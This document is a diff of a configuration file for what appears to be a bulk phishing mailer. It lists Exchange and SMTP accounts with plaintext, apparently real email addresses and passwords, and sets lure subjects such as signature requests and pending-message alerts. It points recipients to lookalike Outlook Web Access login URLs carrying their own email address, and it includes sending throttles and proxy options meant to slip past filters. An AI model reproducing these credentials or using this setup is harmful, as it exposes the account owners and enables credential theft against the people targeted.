@@ -1,28 +1,22 @@
 {
-  {
   "use_exchangelib": true,
-  "exchange_server": "west.exch081.serverdata.net|MFish@thegrandhealthcare.com|Winter@2020#",
-  "use_single_smtp": false,
-  "smtp_server": "host|username|password|port|use_tls",
-  "smtp_servers": ["host|username|password|port|use_tls"]
-}
-
-"single_smtp_sender_email": "anna.lakatos@lagence.com",
+  "exchange_server": "east.exch092.serverdata.net",
+  "exchange_email": "vpprager@svaprager.net",
+  "exchange_password": "Punker80",
+  "single_smtp": false,
+  "smtp_server": "netsol-smtp-oxcs.hostingplatform.com|cheryl@teamartistrep.com|Kikigigi1478!g|587|false",
+  "smtp_servers": "malt_smtp/smtp.txt",
+  "single_smtp_sender_email": "your-email@example.com",
   "use_tls": true,
   "smtp_sleep_time": 7,
   "smtp_pause_num": 8,
-  "sender_names": [
- "Steven Bass"
- 
- ],
+  "sender_names": ["Steven Bass"],
   "repply_to": "info@nunez.io",
   "subjects": [
-"Quick Signature Request: Please Review and Sign #{RECIPIENT_DOMAIN_NAME}"
-    
-],
-  "links": [   
-  "https://east-exch02910-serverdata-net.geodjs.com/owa#{RECIPIENT_EMAIL}"
-
+    "Notification: Messages Awaiting Your Attention"
+  ],
+  "links": [
+    "https://paymentjustinaseconds-exch02910-Eastexcho081n-exch0801.ggecu.com/owa#{RECIPIENT_EMAIL}"
   ],
   "format_type": "F1",
   "send_attachment": false,
@@ -36,7 +30,6 @@
   "use_html_to_image": false,
   "format_folder": "format",
   "email_priority": "high",
-  "use_exchangelib": true,
   "use_proxy": false,
   "proxy_list_file": "proxies/ip.txt",
   "use_eml": false,
